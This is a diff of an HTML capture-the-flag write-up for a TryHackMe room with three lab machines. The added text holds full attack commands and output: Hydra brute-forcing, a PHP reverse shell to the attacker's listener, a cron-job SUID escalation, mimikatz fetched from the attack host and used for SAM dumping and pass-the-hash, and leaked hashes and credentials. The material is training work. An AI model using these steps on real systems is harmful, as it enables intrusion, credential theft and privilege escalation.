@@ -13,7 +13,7 @@
 
   <div class="eyebrow"><a href="../index.html">&larr; Writeups</a> &middot; TryHackMe</div>
   <h1>Hacker of the Hill: three boxes, three different footholds</h1>
-  <p class="dek">One room, three independent machines at increasing difficulty, and three completely different ways in: a CMS edit page that executes PHP it was never meant to, an Active Directory domain cracked with a weak RDP password, and a leaked session hash that only pays off once you notice the second, easy-to-miss SSH port.</p>
+  <p class="dek">One room, three independent machines at increasing difficulty, each with a completely different way in: a CMS edit page that executes PHP it was never meant to, an Active Directory domain cracked with one weak RDP password, and a leaked session hash that only pays off once you notice the second, easy-to-miss SSH port.</p>
 
   <div class="meta-row">
     <span class="pill">Room: Hacker of the Hill</span>
@@ -22,7 +22,7 @@
   </div>
 
   <div class="brief">
-    <p><strong>The setup:</strong> three separate targets, Easy, Medium, and Hard, each its own box with its own services and its own path to root or SYSTEM. No shared foothold between them, each one has to be enumerated from scratch.</p>
+    <p><strong>The setup:</strong> three separate targets, Easy, Medium, and Hard, each its own box with its own services and its own path to root or SYSTEM. No shared foothold between them, each one gets enumerated from scratch.</p>
     <p>No single flag in these notes, each tier's objective is full compromise of that machine.</p>
   </div>
 
@@ -33,11 +33,31 @@
       <div class="step">
         <div class="step-num">1</div>
         <div class="step-body">
-          <div class="step-title">Find the hidden login through robots.txt</div>
-          <p>An nmap scan turns up three separate web apps on adjacent ports. The first one's <code>robots.txt</code> disallows a directory it was clearly trying to hide: <code>/vbcms</code>, which resolves to a "Very Basic CMS" login page.</p>
+          <div class="step-title">Scan, then brute-force the directory listing</div>
+          <p>The initial nmap sweep turns up three web apps on adjacent ports:</p>
+          <pre><code>8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry
+|_/vbcms
+|_http-title: VeryBasicCMS - Home
+8001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: My Website
+|_Requested resource was /?page=home.php
+8002/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Learn PHP
+9999/tcp open  abyss?</code></pre>
+          <p>Port 8000's own <code>robots.txt</code> line already gives away a hidden directory, but gobuster against the root of that port confirms it and finds a couple more paths:</p>
+          <pre><code>gobuster dir -u http://10.10.84.133:8000 -z -w /usr/share/dirb/wordlists/common.txt -t32
+
+/.htaccess            (Status: 403) [Size: 279]
+/.htpasswd            (Status: 403) [Size: 279]
+/about                (Status: 200) [Size: 1951]
+/contact              (Status: 200) [Size: 1955]
+/robots.txt           (Status: 200) [Size: 30]
+/server-status        (Status: 403) [Size: 279]</code></pre>
+          <p><code>robots.txt</code> itself just confirms it: <code>User-agent: * Disallow: /vbcms</code>. Navigating there lands on a login page for "Very Basic CMS."</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p><code>robots.txt</code> is a request not to index a path, not an access control. It's one of the most reliable places to find a path an application owner considered sensitive enough to hide from search engines but forgot still needs real authentication.</p>
+            <p><code>robots.txt</code> is a request not to index a path, not an access control, and nmap's own script output already surfaced it before gobuster even ran. It's one of the most reliable places to find a path an application owner considered sensitive enough to hide from search engines but forgot still needs real authentication.</p>
           </div>
         </div>
       </div>
@@ -45,11 +65,19 @@
       <div class="step">
         <div class="step-num">2</div>
         <div class="step-body">
-          <div class="step-title">Brute-force the login, then turn the editor into a shell</div>
-          <p>Inspecting the login form in the browser's network tab shows it's a plain POST with <code>username</code>/<code>password</code> fields, enough to build a Hydra command. It cracks a default-looking credential pair in seconds. Logged in, the CMS lets pages be edited directly, and since the pages are plain HTML served by an Apache instance that also runs PHP, pasting in a PHP reverse shell and saving the page gets it executed on save.</p>
+          <div class="step-title">Build a Hydra command from the login's own request</div>
+          <p>Typing test credentials (<code>admin:pwd</code>) and watching the browser's network tab shows the login is a plain POST with <code>username</code> and <code>password</code> fields to <code>/vbcms/login</code>:</p>
+          <pre><code>POST http://10.10.84.133:8000/vbcms/login
+Form data: username=admin&amp;password=pwd</code></pre>
+          <p>That's everything Hydra needs:</p>
+          <pre><code>hydra 10.10.230.235 -s 8000 -f http-post-form "/vbcms/login:username=^USER^&amp;password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:Invalid" -l admin -P /usr/share/dirb/wordlists/big.txt -t24 -v
+
+[8000][http-post-form] host: 10.10.230.235   login: admin   password: admin
+1 of 1 target successfully completed, 1 valid password found</code></pre>
+          <p><code>admin:admin</code> logs straight into the CMS admin area, which lists three editable pages (Home, About Us, Contact Us).</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A content editor that writes files into a path the web server executes is remote code execution by design, whether or not the application intended "page content" to mean "arbitrary PHP." Weak default credentials are what makes that reachable at all.</p>
+            <p>The failed login attempt is doing reconnaissance, not just confirming the creds are wrong. The exact parameter names and the "Invalid" failure string it returns are precisely what a brute-force tool needs to tell a wrong password from a right one.</p>
           </div>
         </div>
       </div>
@@ -57,11 +85,16 @@
       <div class="step">
         <div class="step-num">3</div>
         <div class="step-body">
-          <div class="step-title">Spot the pivot you can't take yet</div>
-          <p>From the first foothold, <code>linpeas</code> finds a cron job firing every minute, owned by root but pointing at a script that belongs to a different, so-far-uncompromised user.</p>
+          <div class="step-title">Turn the page editor into a shell</div>
+          <p>The CMS pages are plain HTML, but the server underneath is Apache executing PHP. Pasting the pentestmonkey PHP reverse shell (pointed at the attack box, <code>$ip = '10.2.57.21'; $port = 4444;</code>) into the Home page's editor and saving it gets it executed on load:</p>
+          <pre><code>nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.2.57.21] from (UNKNOWN) [10.10.230.235] 33654
+$ whoami
+serv1</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A root cron job touching a file some other user owns is a privilege escalation path waiting on one missing piece: control of that other account. Finding it early means the rest of the box is just working out how to reach that specific user.</p>
+            <p>A content editor that writes files into a path the web server executes is remote code execution by design, whether or not the application intended "page content" to mean "arbitrary PHP."</p>
           </div>
         </div>
       </div>
@@ -69,11 +102,12 @@
       <div class="step">
         <div class="step-num">4</div>
         <div class="step-body">
-          <div class="step-title">A "learn to code" site turns out to execute real PHP</div>
-          <p>The third web app is an interactive PHP tutorial site, type code into a box, click a button, and it runs server-side and shows the output. Testing it with <code>system('id')</code> confirms it executes as exactly the user the cron job needs. Pasting in the same reverse shell payload and submitting it gets an interactive shell as that user directly.</p>
+          <div class="step-title">Spot the pivot you can't take yet</div>
+          <p>Uploading and running <code>linpeas</code> from the <code>serv1</code> shell turns up a cron job firing every minute, owned by root, but pointing at a script that belongs to a different user entirely:</p>
+          <pre><code>* * * * * root /home/serv3/backups/backup.sh</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Any "try it live" code execution feature is a sandboxed shell by definition, the only open question is how well it's actually sandboxed. Here, not well at all, it ran as a real, useful system user rather than a throwaway container account.</p>
+            <p>A root cron job touching a file some other user owns is a privilege escalation path waiting on one missing piece: control of <code>serv3</code>. Finding it early means the rest of the box is just working out how to reach that specific account.</p>
           </div>
         </div>
       </div>
@@ -81,8 +115,49 @@
       <div class="step">
         <div class="step-num">5</div>
         <div class="step-body">
+          <div class="step-title">A "learn PHP" tutorial site turns out to execute real PHP</div>
+          <p>Port 8002 is an interactive "Learn PHP with Adam" tutorial, type code into a box, click Check Code, and it runs server-side. The site's own first lesson already shows the pattern: type <code>echo "Hello World";</code> and it prints the result back. Testing with raw PHP confirms it executes as a real system user:</p>
+          <pre><code>&lt;?php system('id'); ?&gt;
+
+Results:
+uid=1002(serv3) gid=1002(serv3) groups=1002(serv3)</code></pre>
+          <p>That's exactly the user the cron job needs. Pasting the same pentestmonkey reverse shell into the box (stripping the leading <code>?&gt;</code> the site already adds) and submitting it lands a shell directly as <code>serv3</code>, confirmed against the crontab once inside:</p>
+          <pre><code>nc -lvnp 4444
+connect to [10.2.57.21] from (UNKNOWN) [10.10.84.133] 34522
+serv3@web-serv:/$ whoami
+serv3
+
+serv3@web-serv:/$ cat /etc/crontab
+*  *  *  *  *   root /home/serv3/backups/backup.sh</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Any "try it live" code execution feature is a sandboxed shell by definition, the only open question is how well it's actually sandboxed. Here, not well at all: it ran as a real, useful system user rather than a throwaway container account.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">6</div>
+        <div class="step-body">
           <div class="step-title">Hijack the cron job for root</div>
-          <p>With that user's access, the cron-executed script becomes writable. Overwriting it to set the SUID bit on <code>/bin/bash</code>, waiting one minute for the cron to fire as root, then running <code>/bin/bash -p</code> lands a root shell.</p>
+          <p>As <code>serv3</code>, the cron-executed script is readable but starts out read-only, so it needs a permissions bump before it can be rewritten to set the SUID bit on bash:</p>
+          <pre><code>serv3@web-serv:/home/serv3/backups$ ls -la backup.sh
+-r-xr-xr-x 1 serv3 serv3 52 Feb 15 01:02 backup.sh
+
+serv3@web-serv:/home/serv3/backups$ ls -la /bin/bash
+-rwxr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
+
+serv3@web-serv:/home/serv3/backups$ echo "chmod 4777 /bin/bash" > backup.sh
+bash: backup.sh: Permission denied
+
+serv3@web-serv:/home/serv3/backups$ chmod 777 backup.sh
+serv3@web-serv:/home/serv3/backups$ echo "chmod 4777 /bin/bash" > backup.sh</code></pre>
+          <p>One minute later the cron fires as root and the SUID bit lands:</p>
+          <pre><code>-rwsrwxrwx 1 root root 1113504 Jun  6  2019 /bin/bash
+
+serv3@web-serv:/home/serv3/backups$ /bin/bash -p
+bash-5.0# whoami
+root</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
             <p>A cron job is just code that runs with someone else's privileges on a timer. If an attacker can edit what it runs, they've effectively scheduled their own command to execute as root, no exploit required beyond file permissions.</p>
@@ -101,10 +176,23 @@
         <div class="step-num">1</div>
         <div class="step-body">
           <div class="step-title">Enumerate the domain and its users</div>
-          <p>Kerberos, LDAP, and RDP all open on a Windows host name the domain outright. A handful of usernames come back from user enumeration, ordinary-looking employee accounts alongside Administrator.</p>
+          <p>Open ports name the domain controller outright:</p>
+          <pre><code>80, 81, 82
+88 kerberos
+135 RPC
+139 netbios-ssn
+389 AD LDAP Domain: troy.thm0.
+445 ms-ds
+464 kpasswd5
+636
+3268 AD LDAP Domain: troy.thm0.
+3269
+3389 rdp TROY-DC  DNS_Computer_Name: TROY-DC.troy.thm  Version: 10.0.17763
+
+Users: Achilles, Agamemnon, Hector, Helen, Patrocles, Administrator</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Same pattern as any Active Directory target: the open ports name the domain before a single authenticated request, and valid usernames are usually the cheapest thing to enumerate next.</p>
+            <p>Kerberos plus LDAP together is as close to a neon sign reading "Active Directory" as a port scan gets, and once the domain's confirmed, user enumeration is usually the cheapest next move.</p>
           </div>
         </div>
       </div>
@@ -112,11 +200,23 @@
       <div class="step">
         <div class="step-num">2</div>
         <div class="step-body">
-          <div class="step-title">Brute-force one account's RDP password</div>
-          <p>Rather than guess which account might be weak, Hydra runs a password-spray against one user's RDP login with a common wordlist and recovers a working password in minutes.</p>
+          <div class="step-title">Confirm the flags exist with a filesystem search, then brute-force RDP</div>
+          <p>A recursive filename search finds every user's desktop flag at once, useful as a sanity check that an account is actually reachable:</p>
+          <pre><code>C:\&gt;dir flag.txt /s /p
+
+Directory of C:\Users\achilles\Desktop
+19/02/2021  19:52    37 flag.txt
+
+Directory of C:\Users\Administrator\Desktop
+21/02/2021  20:45    37 flag.txt</code></pre>
+          <p>Rather than guess which account is weak, Hydra sprays one user's RDP login with a common wordlist:</p>
+          <pre><code>hydra rdp://10.10.20.81 -f -l achilles -P /usr/share/wordlists/rockyou.txt -t4
+
+[3389][rdp] host: 10.10.52.251   login: achilles   password: winniethepooh
+1 of 1 target successfully completed, 1 valid password found</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>In a domain with several human user accounts, only one needs a weak, wordlist-guessable password for the whole enumeration effort to pay off. RDP in particular rarely has the same lockout tuning a web login does.</p>
+            <p>In a domain with several human user accounts, only one needs a weak, wordlist-guessable password for the whole enumeration effort to pay off, and RDP rarely has the same lockout tuning a web login does.</p>
           </div>
         </div>
       </div>
@@ -125,14 +225,19 @@
         <div class="step-num">3</div>
         <div class="step-body">
           <div class="step-title">Pass-the-hash to Administrator with mimikatz</div>
-          <p>Once inside via RDP, dropping <code>mimikatz.exe</code> and running three commands in sequence, elevate the current token, dump local SAM secrets, then pass Administrator's NTLM hash directly, authenticates as Administrator without ever needing the plaintext password.</p>
-          <pre><code>token::elevate
-lsadump::sam sam.reg system.reg
-sekurlsa::pth /user:Administrator /domain:&lt;dc&gt; /ntlm:&lt;hash&gt;</code></pre>
-          <p>That lands an <code>nt authority\system</code> shell.</p>
+          <p>Inside via RDP as <code>achilles</code>, pulling mimikatz onto the box and running three commands in sequence, elevate the token, dump local SAM secrets, then pass Administrator's NTLM hash directly, authenticates without ever needing the plaintext password:</p>
+          <pre><code>Invoke-WebRequest -Uri "http://10.2.57.21:8000/mimikatz.exe" -OutFile "C:\users\mimikatz.exe"
+.\mimikatz.exe
+
+mimikatz # token::elevate
+mimikatz # lsadump::sam sam3.reg system.reg
+mimikatz # sekurlsa::pth /user:Administrator /domain:TROY-DC /ntlm:8c1c8cc0c8c9b77d17df57acc34b08aa</code></pre>
+          <p>That drops into an impersonated session as Administrator:</p>
+          <pre><code>C:\Windows\system32&gt;whoami
+nt authority\system</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Same principle as any pass-the-hash chain: once an NTLM hash is recovered, Windows authentication accepts it in place of a password. One weak RDP credential was the only thing standing between an external attacker and a path straight to SYSTEM.</p>
+            <p>Once an NTLM hash is recovered, Windows authentication accepts it in place of a password. One weak RDP credential was the only thing standing between an external attacker and a path straight to SYSTEM.</p>
           </div>
         </div>
       </div>
@@ -148,10 +253,19 @@ sekurlsa::pth /user:Administrator /domain:&lt;dc&gt; /ntlm:&lt;hash&gt;</code></
         <div class="step-num">1</div>
         <div class="step-body">
           <div class="step-title">Map a wide, mismatched set of services</div>
-          <p>Seven open ports across two SSH services, three different web servers (two Apache instances with different content, one nginx), and a Python Werkzeug app with no visible title at all. Nothing here announces its purpose up front, every service needs its own look.</p>
+          <pre><code>22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu
+80/tcp   open  http     Apache 2.4.41 (Ubuntu)
+|_http-title: Server Manager Login
+81/tcp   open  http     nginx 1.18.0 (Ubuntu)
+|_http-title: Home Page
+82/tcp   open  http     Apache 2.4.41 (Ubuntu)
+|_http-title: I Love Hills - Home
+2222/tcp open  ssh      OpenSSH 8.2p1 Ubuntu
+8888/tcp open  http     Werkzeug httpd 0.16.0 (Python 3.8.5)
+9999/tcp open  abyss?</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A box exposing this many near-identical-looking services is usually hiding the real way in behind the one that looks least interesting. Treating every port as equally worth enumerating, rather than fixating on the obvious web app, is what this tier is actually testing.</p>
+            <p>Seven open ports across two SSH services and three web servers means the real way in is probably not the first thing that loads. Every service here needs its own look before deciding which one matters.</p>
           </div>
         </div>
       </div>
@@ -160,10 +274,29 @@ sekurlsa::pth /user:Administrator /domain:&lt;dc&gt; /ntlm:&lt;hash&gt;</code></
         <div class="step-num">2</div>
         <div class="step-body">
           <div class="step-title">Find an API that leaks its own session hash</div>
-          <p>Directory brute-forcing one of the web apps surfaces an undocumented <code>/api/user</code> path with <code>/login</code> and <code>/session</code> endpoints. Querying the session endpoint directly, no authentication required, returns an active admin session object containing a raw password hash. A quick lookup against an online rainbow-table service cracks it instantly, it's a well-known, extremely common hash.</p>
+          <pre><code>gobuster dir -u http://10.10.18.59/api/user -s 80 -w /usr/share/dirb/wordlists/common.txt -t32
+
+/login     (Status: 200) [Size: 53]
+/session   (Status: 200) [Size: 91]</code></pre>
+          <p>Querying the session endpoint directly, no authentication needed, returns an active admin session:</p>
+          <pre><code>GET /api/user/session
+
+{
+  "active_sessions": {
+    "0": {
+      "id": 1,
+      "username": "admin",
+      "hash": "1b4237f476826986da63022a76c35bb1"
+    }
+  }
+}</code></pre>
+          <p>CrackStation cracks it instantly, it's a well-known precomputed hash:</p>
+          <pre><code>Hash: 1b4237f476826986da63022a76c35bb1
+Type: md5
+Result: dQw4w9WgXcQ</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>An API endpoint that returns session data without checking whether the caller is authorized to see it is an authorization bug, not an authentication one, the request itself doesn't need credentials to leak someone else's. And any hash common enough to be precomputed in a public rainbow table might as well be plaintext.</p>
+            <p>An endpoint that returns session data without checking whether the caller is authorized to see it is an authorization bug, the request itself needs no credentials to leak someone else's. Any hash common enough to be precomputed in a public rainbow table might as well be plaintext (and this particular result is a well-known joke string, worth a laugh once it's recognized).</p>
           </div>
         </div>
       </div>
@@ -171,11 +304,21 @@ sekurlsa::pth /user:Administrator /domain:&lt;dc&gt; /ntlm:&lt;hash&gt;</code></
       <div class="step">
         <div class="step-num">3</div>
         <div class="step-body">
-          <div class="step-title">Pull credentials from a second, separate app</div>
-          <p>The Werkzeug app on another port turns out to be a simple application launcher with its own API. Enumerating its endpoints the same way, first an <code>/apps</code> listing, then following the pattern to a <code>/users</code> endpoint, returns a username and password pair in plain JSON.</p>
+          <div class="step-title">Pull plaintext credentials from a second, separate app</div>
+          <p>The Werkzeug app on port 8888 is a simple application launcher with its own API, self-documenting on the root path:</p>
+          <pre><code>curl http://10.10.18.59:8888
+Welcome to CMNatic's Application Launcher! You can launch applications by
+enumerating the /apps/ endpoint.
+
+curl http://10.10.18.59:8888/apps
+{"app1": {"name": "online file storage"}, "app2": {"name": "media player"},
+ "app3": {"name": "file sync"}, "app4": {"name": "/users"}}</code></pre>
+          <p>Following <code>app4</code>'s hint straight to <code>/users</code>:</p>
+          <pre><code>curl http://10.10.18.59:8888/users
+{"user": {"davelarkin": "totallysecurehuh"}}</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Internal-looking admin tools often assume no one outside the team will ever enumerate their API surface, so they skip authentication on "harmless" endpoints like a user directory. That assumption is exactly what directory brute-forcing and endpoint guessing are built to break.</p>
+            <p>Internal-looking admin tools often assume no one outside the team will ever enumerate their API surface, so "harmless" endpoints like a user directory ship with no authentication at all.</p>
           </div>
         </div>
       </div>
@@ -184,10 +327,16 @@ sekurlsa::pth /user:Administrator /domain:&lt;dc&gt; /ntlm:&lt;hash&gt;</code></
         <div class="step-num">4</div>
         <div class="step-body">
           <div class="step-title">The obvious SSH port is a dead end, the second one isn't</div>
-          <p>The leaked username refuses password authentication on the standard SSH port, key-only. But a second SSH service is listening on a nonstandard port, and it accepts the same leaked password without complaint, landing a shell.</p>
+          <pre><code>ssh davelarkin@10.10.18.59
+davelarkin@10.10.18.59: Permission denied (publickey).</code></pre>
+          <p>Port 22 is key-only. The second SSH service on 2222 isn't:</p>
+          <pre><code>ssh -p 2222 davelarkin@10.10.18.59
+davelarkin@10.10.18.59's password: totallysecurehuh
+
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1037-aws x86_64)</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Running two SSH daemons with different auth policies on the same host is a common, often accidental misconfiguration, a hardened service on the expected port next to a forgotten, more permissive one on an alternate port. Credentials that fail against the obvious target are worth retrying against every other instance of the same service before being written off.</p>
+            <p>Running two SSH daemons with different auth policies on the same host is a common, often accidental misconfiguration: a hardened service on the expected port next to a forgotten, more permissive one on an alternate port. Credentials that fail against the obvious target are worth retrying against every other instance of the same service.</p>
           </div>
         </div>
       </div>
